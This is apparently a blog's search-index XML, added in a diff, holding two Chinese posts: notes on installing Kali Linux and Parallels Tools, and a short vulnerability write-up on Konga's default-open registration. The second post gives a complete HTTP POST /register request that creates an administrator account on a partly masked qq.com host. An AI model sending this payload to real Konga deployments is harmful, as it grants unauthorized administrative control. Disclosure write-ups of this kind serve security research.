@@ -1,0 +1,45 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search>
+  
+  
+  
+  <entry>
+    <title>Parallels安装kali折腾笔记</title>
+    <link href="/2021/01/06/Parallels%E5%AE%89%E8%A3%85kali%E6%8A%98%E8%85%BE%E7%AC%94%E8%AE%B0/"/>
+    <url>/2021/01/06/Parallels%E5%AE%89%E8%A3%85kali%E6%8A%98%E8%85%BE%E7%AC%94%E8%AE%B0/</url>
+    
+    <content type="html"><![CDATA[<h1 id="Parallels安装kali折腾笔记"><a href="#Parallels安装kali折腾笔记" class="headerlink" title="Parallels安装kali折腾笔记"></a>Parallels安装kali折腾笔记</h1><p>安装版本：</p><blockquote><p>kali-linux-2020.2-installer-amd64.iso<br>Parallels 16.0.1</p></blockquote><h2 id="Change-Aliyun-source"><a href="#Change-Aliyun-source" class="headerlink" title="Change Aliyun source"></a>Change Aliyun source</h2><p>nano /etc/apt/sources.list </p><pre><code class="hljs plain">#deb https:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;kali kali-rolling main non-free contrib#deb-src https:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;kali kali-rolling main non-free contrib</code></pre><h2 id="Update-Soft"><a href="#Update-Soft" class="headerlink" title="Update Soft"></a>Update Soft</h2><pre><code class="hljs plain">apt-get cleanapt-get updateapt-get upgrade -yapt-get dist-upgrade -yapt-get install dkms kpartx printer-driver-postscript-hp</code></pre><h2 id="Install-Parallels-Tools"><a href="#Install-Parallels-Tools" class="headerlink" title="Install Parallels Tools"></a>Install Parallels Tools</h2><pre><code class="hljs plain">sudo -seject &#x2F;dev&#x2F;cdrom 然后挂载toolsmkdir &#x2F;media&#x2F;ptmkdir &#x2F;root&#x2F;Desktop&#x2F;ptmount &#x2F;dev&#x2F;cdrom &#x2F;media&#x2F;ptcp -r &#x2F;media&#x2F;pt&#x2F;  &#x2F;root&#x2F;Desktop&#x2F;ptcd &#x2F;root&#x2F;Desktop&#x2F;pt&#x2F;pt.&#x2F;install</code></pre><h2 id="无法安装linux-headers"><a href="#无法安装linux-headers" class="headerlink" title="无法安装linux-headers"></a>无法安装linux-headers</h2><pre><code class="hljs plain">接下来的错误都是要查看日志文件了cat &#x2F;var&#x2F;log&#x2F;parallels-tools-install.log如果是无法安装linux-headers的话，就要手动安装。 先查看内核版本uname -a然后来这里http:&#x2F;&#x2F;http.kali.org&#x2F;kali&#x2F;pool&#x2F;main&#x2F;l&#x2F;linux&#x2F;下载三个对应内核版本的安装包手动安装国内使用aliyun下载更快 https:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;kali&#x2F;pool&#x2F;main&#x2F;l&#x2F;linux&#x2F;linux-kbuild: linux-kbuild-xxxx_amd64.deblinux-header-common: linux-headers-xxxx-common_xxxx_amd64.deblinux-compiler-gcc: linux-compiler-gcc-xxx-amd64.deblinux-headers: linux-headers-xxxx_amd64.deb下载完成后，用dpkg命令安装deb包。dpkg -i xxxxx.deb</code></pre><h2 id="装完Tools后登陆白屏问题解决"><a href="#装完Tools后登陆白屏问题解决" class="headerlink" title="装完Tools后登陆白屏问题解决"></a>装完Tools后登陆白屏问题解决</h2><blockquote><p>关闭3D加速</p></blockquote><p><img src="_v_images/20201117063645183_1265656573.png" srcset="/img/loading.gif" alt=""></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.sqlsec.com/2019/12/pd.html" target="_blank" rel="noopener">https://www.sqlsec.com/2019/12/pd.html</a></p><p><a href="https://cloud.tencent.com/developer/article/1561336" target="_blank" rel="noopener">https://cloud.tencent.com/developer/article/1561336</a></p><p><a href="https://forum.parallels.com/threads/how-to-install-the-parallels-tools-on-kali-linux.348342/" target="_blank" rel="noopener">https://forum.parallels.com/threads/how-to-install-the-parallels-tools-on-kali-linux.348342/</a></p>]]></content>
+    
+    
+    
+    <tags>
+      
+      <tag>疑难杂症</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>Konga Unauthorized registration</title>
+    <link href="/2020/05/27/Konga-Unauthorized-registration/"/>
+    <url>/2020/05/27/Konga-Unauthorized-registration/</url>
+    
+    <content type="html"><![CDATA[<h1 id="Konga-Unauthorized-registration"><a href="#Konga-Unauthorized-registration" class="headerlink" title="Konga Unauthorized registration"></a>Konga Unauthorized registration</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><blockquote><p>Konga不是官方应用。与Kong没有联系。<br>官方：<a href="https://github.com/pantsel/konga" target="_blank" rel="noopener">https://github.com/pantsel/konga</a></p></blockquote><p><img src="https://l1e.oss-cn-beijing.aliyuncs.com/img/20200527163248.png" srcset="/img/loading.gif" alt=""></p><h2 id="后台任意管理员注册"><a href="#后台任意管理员注册" class="headerlink" title="后台任意管理员注册"></a>后台任意管理员注册</h2><blockquote><p>默认开放注册<br>直接发送请求即可</p></blockquote><p><img src="https://l1e.oss-cn-beijing.aliyuncs.com/img/20200527214601.jpg" srcset="/img/loading.gif" alt=""></p><p><strong>Payload</strong> ：</p><pre><code class="hljs plain">POST &#x2F;register HTTP&#x2F;1.1Host: xx.qq.comConnection: closeAccept: application&#x2F;json, text&#x2F;plain, *&#x2F;*Sec-Fetch-Dest: emptyconnection-id: User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;80.0.3987.163 Safari&#x2F;537.36Origin: https:&#x2F;&#x2F;xx.qq.comSec-Fetch-Site: same-originSec-Fetch-Mode: corsReferer: https:&#x2F;&#x2F;xx.qq.com&#x2F;Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q&#x3D;0.9Content-Length: 106&#123;&quot;username&quot;:&quot;admintest&quot;,&quot;email&quot;:&quot;testa@qq.com&quot;,&quot;password&quot;:&quot;qqAAwiqk1&quot;,&quot;password_confirmation&quot;:&quot;qqAAwiqk1&quot;&#125;</code></pre>]]></content>
+    
+    
+    
+    <tags>
+      
+      <tag>漏洞详情</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  
+</search>
